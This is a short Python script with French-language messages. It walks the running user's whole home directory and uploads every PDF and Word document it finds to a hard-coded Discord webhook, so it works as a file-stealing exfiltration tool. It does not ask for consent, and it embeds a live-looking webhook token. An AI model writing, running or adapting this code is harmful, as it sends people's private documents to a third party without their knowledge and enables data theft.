import os
import requests

WEBHOOK_URL = "https://discord.com/api/webhooks/1400815282636718140/31-1vjBEwEgf1Yb49oXy4WqZBCXCHuGosdbhh4uivPJxHXHZlUCvJgfZ2xbi5rHK60eD"

TARGET_DIRECTORY = os.path.expanduser("~")

ALLOWED_EXTENSIONS = {".pdf", ".docx", ".doc"}

def send_file_to_discord(file_path):
    with open(file_path, "rb") as file:
        payload = {
            "content": f"Fichier envoyé : {os.path.basename(file_path)}"
        }
        files = {
            "file": (os.path.basename(file_path), file)
        }
        response = requests.post(WEBHOOK_URL, data=payload, files=files)
        if response.status_code == 200:
            print(f"Fichier {os.path.basename(file_path)} envoyé avec succès !")
        else:
            print(f"Erreur lors de l'envoi de {os.path.basename(file_path)} : {response.status_code}")

def send_files(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            file_extension = os.path.splitext(file)[1].lower()
            if file_extension in ALLOWED_EXTENSIONS:
                try:
                    send_file_to_discord(file_path)
                except Exception as e:
                    print(f"Erreur lors du traitement de {file_path} : {e}")

if __name__ == "__main__":
    send_files(TARGET_DIRECTORY)